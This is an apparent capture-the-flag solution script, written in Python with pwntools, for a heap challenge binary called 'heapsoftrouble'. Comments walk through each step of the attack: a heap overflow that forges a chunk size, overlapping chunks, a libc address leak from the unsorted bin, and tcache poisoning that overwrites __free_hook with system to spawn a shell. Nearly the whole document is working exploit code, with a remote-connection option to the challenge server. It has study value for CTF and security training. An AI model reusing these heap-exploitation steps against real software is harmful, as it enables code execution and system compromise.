"""
Neat heap challenge. Each matrix has an 0x50 name chunk (allocated first) and an 0x30
chunk that holds the population and power information. We can create and delete matricies,
as well as print them out. There's also a hidden option to allocate an 0x30 chunk and
write 0x50 bytes of data to it, giving us a nice overflow. Finally, there's an option
to update the population in a given matrix, which we don't use.

When the binary starts, it pre-allocates 16 matricies (the maximum allowed), although
these are special and have name chunks that are only 0x30 in size. We start the exploit
by clearing these out, using the delete and overflow functionality to use up those chunks
without wasting matricies (we don't actually overflow anything, just allocate away the
chunk).

Next, we allocate a mew matrix, and use the overflow to overwrite the size of it's name
chunk to 0x420, and then allocate 8 other matricies. When we free A, the overwritten size
of it's name chunk causes it to be freed into the unsorted bin, and further chunks we
allocate will overlap with the chunks for the 8 other matricies we allocated. We use the
overlapping chunks to leak libc from the fd pointer of the chunk in the unsorted bin.

Finally, we use the overflow to overwrite a pointer in the tcache freelist and point it 
at __free_hook. We overwrite that with system, and then free a matrix named "/bin/sh" to
win.

Comments in Exploit section explain more
"""
from pwn import *

binary_path = "./heapsoftrouble"

lib_path = "./lib/"
UNSORTED_BIN_OFFSET = 0x1b9a40

#lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.31/"
#UNSORTED_BIN_OFFSET = 0x3b5be0

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""
set follow-fork-mode parent

#contextwatch execute "vis 50 0x55555555a8a0"
contextwatch execute "vis 50"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="15%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

# python
# import splitmind
# (splitmind.Mind()
#     .tell_splitter(show_titles=True)
#     .tell_splitter(set_title="gdb")
#      #.above(of="main", display="expressions", size="75%")
#      #.left(of="expressions", display="disasm", size="35%")
#     .above(of="main", display="stack", size="75%")
#     .left(of="stack", display="regs", size="66%")
#     .right(of="regs", display="disasm")
# ).build(nobanner=True)
# end

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc chal.ctf.b01lers.com 1010
        return remote("chal.ctf.b01lers.com", 1010)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()

#=Menu Functions===============================================================#

def create(io, name, population=0x1111):
    io.sendline("1")
    io.recvuntil("Matrix: ")

    io.sendline(name)
    io.recvuntil("matrix: ")

    io.sendline(f"{population}")
    
    io.recvuntil("1) ")
    io.clean()

    return name


def delete(io, name, clean=True):
    io.sendline("2")
    io.recvuntil("Matrix: ")

    io.sendline(name)
    
    if clean:
        io.recvuntil("1) ")
        io.clean()


def showAll(io):
    io.sendline("5")
    output = io.recvuntil("Human Population", drop=True)

    io.recvuntil("1) ")
    io.clean()

    return output


def overflow(io, data):
    io.sendline("7")
    io.sendline(data)

    io.recvuntil("1) ")
    io.clean()

#=Exploit=================================================================#

io = start()

# "Login"
io.sendline("user")

# Delete matricies, use overflow function to keep free lists empty
print("DELETING EXISTING MATRICIES", end="")
for x in range(15):
    delete(io, f"Matrix #{x}")
    overflow(io, "a")
    overflow(io, "a")
    print(".", end="")
print("DONE")

# Delete last matrix, don't re-allocate chunks. This leaves three 0x30 chunks in the
# tcache
delete(io, "Matrix #15")

# Allocating a new matrix uses one of the 0x30 chunks, and adds a new 0x50 chunk at the
# end
A = create(io, name="AAAAAAAA")

# Use up another 0x30 chunk, leaving a single 0x30 chunk right before an 0x50 chunk (A's
# name chunk)
overflow(io, "b")

# Use the final free 0x30 chunk to overwrite the size of A's name chunk to 0x420. This 
# means that when it gets freed, it will end up in the unsorted bin, and we can
# remainder chunks from it that will end up overlapping other chunks
overflow(io, flat({
    0x28: p16(0x421)
}))

# Now that we edited chunk A's size, we need a chunk at it's new end in order to free it
# without errors. If we allocate 8 matricies, the 0x420 chunk will line up with I's
# matrix struct chunk. We will also be using B's name chunk to leak libc from the fd 
# pointer of an overlapping chunk in the unsorted bin. The alignment isn't exact, so the
# original name needs to be long enough to include the pointer
B = create(io, name="BBBBBBBB" * 3)
C = create(io, name="CCCCCCCC")
D = create(io, name="DDDDDDDD")
E = create(io, name="EEEEEEEE")
F = create(io, name="FFFFFFFF")
G = create(io, name="GGGGGGGG")
H = create(io, name="HHHHHHHH")
I = create(io, name="IIIIIIII")

# Free A into unsortedbin, creating overlaping chunks
delete(io, A)

# Clear out chunks from tchache
overflow(io, "c")
overflow(io, "c")

# This chunk gets remaindered off of the chunk in the unsortedbin, creating an 0x30 chunk
# inside A's old name chunk.
overflow(io, "c")

# We will need G and H free later, but doing it now allows us to use the 0x30 chunk
# allocated by selectMatrix() to our advantage. It also gets remaindered off of the chunk
# in the unsorted bin, pushing the fd and bk pointers of the new unsortedbin chunk into
# B's name chunk
delete(io, G)
delete(io, H)

# B's name now contains the address of the unsortedbin in the main_arena (i.e. a libc
# pointer). Parse it out of the output of the "Show All Matrixes" menu option
leak = showAll(io)
unsortedbin_addr = u64(leak[0x18:0x20])

# UNSORTED_BIN_OFFSET is calculated GDB
libc.address = unsortedbin_addr - UNSORTED_BIN_OFFSET
print(f"UNSORTEDBIN: {hex(unsortedbin_addr)}")
print(f"LIBC: {hex(libc.address)}")


# Now that we have libc, the plan is to overwrite the fd pointer of a chunk in the tcache
# list and point it to the __free_hook variable in libc. When set, __free_hook is treated
# as a function pointer, and is called "instead" of free(), and with the same arguments.
# If we set it to the address of system and call it with the address of chunk that
# contains the string "/bin/sh", the program will end up calling system("/bin/sh") 
# instead of freeing the chunk!

# The first 0x30 chunk in the tcache won't let us overwrite anything, so we allocate it 
# away
overflow(io, "d")

# Overwrite the fd pointer of an 0x50 chunk in the tcache. Because of how the overflow
# function attempts to remove the trailing newline, it ends up nulling out the last byte 
# of the address, so we append an 0xff so that gets nulled instead.
overflow(io, flat({
    0x30: p64(libc.sym.__free_hook | 0x00ff000000000000)
}))

# Allocate a matrix with the name "/bin/sh". This serves two purposes. First, we use the
# 0x50 chunk whose pointer we just overwrote, so the next 0x50 chunk we allocate will be
# at the address of __free_hook. Second, we also get the chunk with "/bin/sh" in it, as
# mentioned above
BINSH = create(io, name="/bin/sh")

# The name chunk of this matrix is at the address of __free_hook, so it will be set to
# whatever we name this chunk to
FREE_HOOK = create(io, name=p64(libc.sym.system))

# Now that __free_hook as been overwritten, deleting BINSH will end up calling
# system("/bin/sh"), as explained above
delete(io, BINSH, clean=False)

io.interactive()

# flag{Y0u_w1n_pwn}
